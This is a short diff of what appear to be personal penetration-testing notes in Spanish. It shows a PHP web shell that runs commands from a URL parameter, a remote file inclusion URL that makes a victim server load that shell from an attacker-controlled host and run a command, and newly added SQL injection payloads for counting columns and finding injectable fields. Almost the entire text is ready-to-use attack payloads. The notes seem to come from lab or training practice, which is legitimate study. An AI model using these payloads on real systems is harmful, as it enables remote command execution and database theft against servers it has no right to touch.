@@ -33,4 +33,9 @@ se debe crear un archivo en el atacante
 <?php echo shell_exec($_GET['cmd']);?>
 se ejecuta desde la victima
 http://192.168.239.10/menu.php?file=http://192.168.119.239/evil.txt.php&cmd=ipconfig
-###
+###SQLI
+--identificar columnas 
+?id=1 GROUP BY 5--+
+--identificar campos vulnerables
+?id=1 UNION select 1,2,3,4,5
+
